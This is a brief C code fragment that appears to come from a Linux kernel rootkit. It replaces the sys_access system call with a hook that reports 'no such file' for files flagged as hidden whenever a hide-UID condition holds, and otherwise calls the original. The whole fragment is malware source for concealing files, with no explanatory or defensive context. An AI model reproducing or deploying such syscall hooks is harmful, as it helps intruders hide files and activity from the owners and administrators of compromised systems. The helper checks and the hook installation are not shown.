long (*orig_sys_access) (const char __user * filename, int mode);
asmlinkage long my_sys_access(const char __user * filename, int mode)
{
    int fake = check_hide_uid();

    if (fake != 0 && check_hide_file(filename))
        return -ENOENT;

    return orig_sys_access(filename, mode);
}
